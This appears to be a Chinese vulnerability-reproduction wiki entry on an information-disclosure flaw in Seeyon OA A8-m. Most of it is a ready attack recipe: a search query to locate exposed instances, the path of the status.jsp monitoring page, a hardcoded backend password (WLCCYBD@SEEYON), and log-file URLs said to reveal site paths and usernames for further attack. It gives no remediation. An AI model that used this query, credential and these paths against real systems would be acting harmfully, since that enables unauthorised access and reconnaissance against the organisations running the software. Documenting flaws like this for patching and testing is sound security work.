---
title: "致远OA A8 status.jsp 信息泄露漏洞"
date: 2026-10-17 09:13:17
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "致远OA"
tags:
  - "致远OA"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

致远OA A8-m 存在状态监控页面信息泄露，攻击者可以从其中获取网站路径和用户名等敏感信息进一步攻击

## 漏洞影响

```
致远OA A8-m
```

## 网络测绘

```
title="A8-m"
```

## 漏洞复现

访问监控页面

```
/seeyon/management/status.jsp
```

![image-20220520153340922](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201533962.png)

后台密码为 WLCCYBD@SEEYON

登录后通过如下url获得一些敏感信息

```
/seeyon/management/status.jsp
/seeyon/logs/login.log
/seeyon/logs/v3x.log
```

![image-20220520153355298](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201533377.png)

![image-20220520153408356](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201534420.png)

![image-20220520153422315](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201534381.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E8%87%B4%E8%BF%9COA-A8-status.jsp-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md)
